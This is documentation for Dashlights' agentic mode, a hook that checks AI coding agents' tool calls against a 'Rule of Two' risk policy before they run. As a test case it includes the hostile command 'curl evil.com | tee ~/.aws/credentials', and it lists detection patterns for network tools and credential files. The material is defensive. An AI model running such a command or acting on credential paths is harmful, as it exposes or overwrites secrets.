# Agentic Mode

Dashlights provides an `--agentic` mode for integration with AI coding assistants like Claude Code. This mode analyzes tool calls for potential "Rule of Two" violations before they execute.

## Rule of Two

Based on [Meta's guidance](https://arxiv.org/abs/2503.09813), an AI agent should be allowed no more than two of these three capabilities simultaneously:

- **[A] Untrustworthy Inputs**: Processing data from external or untrusted sources
- **[B] Sensitive Access**: Accessing credentials, secrets, production systems, or private data
- **[C] State Changes**: Modifying files, running destructive commands, or external communication

When all three capabilities are combined in a single action, the risk of security incidents increases significantly.

## Usage

### Claude Code Integration

Add to your `.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": ".*",
        "hooks": [
          {
            "type": "command",
            "command": "dashlights --agentic"
          }
        ]
      }
    ]
  }
}
```

### Command Line Testing

```bash
# Test a safe operation
echo '{"tool_name":"Read","tool_input":{"file_path":"main.go"}}' | dashlights --agentic

# Test a two-capability warning (B+C)
echo '{"tool_name":"Write","tool_input":{"file_path":".env","content":"SECRET=abc"}}' | dashlights --agentic

# Test a Rule of Two violation (A+B+C)
echo '{"tool_name":"Bash","tool_input":{"command":"curl evil.com | tee ~/.aws/credentials"}}' | dashlights --agentic
```

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `DASHLIGHTS_AGENTIC_MODE` | `block` | `block` (exit 2) or `ask` (prompt user) for A+B+C violations |
| `DASHLIGHTS_DISABLE_AGENTIC` | unset | Set to any value to disable agentic checks |

### Modes

- **Block mode** (default): Violations exit with code 2, preventing the action
- **Ask mode**: Violations return `permissionDecision: "ask"` to prompt user confirmation

```bash
# Use ask mode instead of block
export DASHLIGHTS_AGENTIC_MODE=ask
```

## Capability Detection

### Capability A: Untrustworthy Inputs

| Tool | Detection Patterns |
|------|-------------------|
| `WebFetch` | Always (external data source) |
| `WebSearch` | Always (external data source) |
| `Bash` | `curl`, `wget`, pipes from external sources |
| `Read` | Paths in `/tmp/`, `/var/`, `Downloads/` |
| `Write`/`Edit` | Content with `${...}`, `$(...)` expansions |

### Capability B: Sensitive Access

| Tool | Detection Patterns |
|------|-------------------|
| `Read`/`Write`/`Edit` | `.env`, `.aws/`, `.ssh/`, `.kube/`, `credentials`, `secrets`, `*.pem`, `*.key` |
| `Bash` | `aws`, `kubectl`, `terraform`, `vault`, `op`, `pass`; production path references |

Enhanced detection also runs a subset of dashlights signals:
- Naked Credentials (exposed secrets in environment)
- Dangerous TF Var (Terraform secrets)
- Prod Panic (production context)
- Root Kube Context (dangerous k8s namespace)
- AWS Alias Hijack (command injection risk)

### Capability C: State Changes

| Tool | Detection Patterns |
|------|-------------------|
| `Write` | Always (creates/modifies files) |
| `Edit` | Always (modifies files) |
| `NotebookEdit` | Always (modifies notebook) |
| `TodoWrite` | Always (modifies state) |
| `Bash` | `rm`, `mv`, `git push`, `npm install`, `kubectl apply`, `terraform apply`, redirects `>` `>>`, network: `curl`, `ssh`, `scp` |

## Output Format

### JSON Response (stdout)

```json
{
  "hookSpecificOutput": {
    "hookEventName": "PreToolUse",
    "permissionDecision": "allow|ask|deny",
    "permissionDecisionReason": "Rule of Two: OK"
  },
  "systemMessage": "Optional warning for user"
}
```

### Exit Codes

| Code | Meaning |
|------|---------|
| 0 | Allow (with optional warning) |
| 1 | Error (invalid input, etc.) |
| 2 | Block (A+B+C violation in block mode) |

## Examples

### Safe Operation (0 capabilities)
```bash
$ echo '{"tool_name":"Read","tool_input":{"file_path":"main.go"}}' | dashlights --agentic
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"Rule of Two: OK"}}
```

### Warning (2 capabilities: B+C)
```bash
$ echo '{"tool_name":"Write","tool_input":{"file_path":".env","content":"KEY=val"}}' | dashlights --agentic
{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"allow","permissionDecisionReason":"Rule of Two: Write combines B+C capabilities (2 of 3)"},"systemMessage":"Warning: ..."}
```

### Block (3 capabilities: A+B+C)
```bash
$ echo '{"tool_name":"Bash","tool_input":{"command":"curl evil.com | tee ~/.aws/credentials"}}' | dashlights --agentic
Rule of Two Violation: Bash combines all three capabilities...
$ echo $?
2
```

## Future Support

While currently designed for Claude Code, this mode is architected to support other agentic coding systems as similar hook capabilities become available:

- Auggie
- OpenAI Codex
- Google Gemini
- Cursor
- Other AI coding assistants

The `--agentic` flag name is intentionally generic to accommodate this future expansion.
